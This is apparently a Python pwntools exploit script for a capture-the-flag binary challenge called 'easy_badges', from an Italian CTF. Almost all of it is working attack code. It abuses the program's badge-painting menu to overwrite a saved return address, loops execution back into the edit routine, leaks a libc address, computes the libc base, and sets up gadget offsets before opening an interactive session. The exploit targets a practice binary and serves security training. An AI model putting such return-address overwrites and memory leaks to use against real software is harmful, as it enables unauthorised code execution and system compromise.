#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'build/easy_badges', checksec=False)

host = args.HOST or '127.0.0.1'#'easybadges.challs.nazionale.olicyber.it'
port = int(args.PORT or 31500)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
b *0x401549
'''.format(**locals())


def move_right(pos: int) -> None:
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b': ', str(pos).encode())
    

def move_left(pos: int) -> None:
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b': ', str(pos).encode())


def paint_current_byte(content: int) -> None:
    assert content < 256 and content >= 0, "Invalid byte: paint byte"
    
    io.sendlineafter(b': ', b'4')
    io.sendlineafter(b': ', str(content).encode())
    

def override_rip(addr: bytes) -> None:
    move_right(88)
    
    for bt in range(len(addr)):
        paint_current_byte(addr[bt])
        
        if bt < 7:
            move_right(1)
        
    move_left(88)
    

def view_badge() -> list[bytes]:
    io.sendlineafter(b': ', b'5')
    data = io.recvlines(10)[1:-1]
    data = [data[i][1:-1].replace(b'.', b'\x00')[::-1] for i in range(8)]
    return data

    
def exit_loop() -> None:
    io.sendlineafter(b': ', b'6')
        

# -- Exploit goes here --

edit_badge_loop = 0x401553
got_addr = 0x00403f90
getenv_offset = 0x487b0
pop_rdi = 0x0000000000401249

io = start()


override_rip(p64(edit_badge_loop))
move_right(25)
override_rip(p64(edit_badge_loop))
move_left(25)
exit_loop()
print(view_badge())
print(view_badge())
exit_loop()
leak = view_badge()
libc = int.from_bytes(leak[1]) - 0x256000
view_badge()

print(leak[1].hex())
print(hex(libc))
exit_loop()

override_rip(p64(edit_badge_loop))

io.interactive()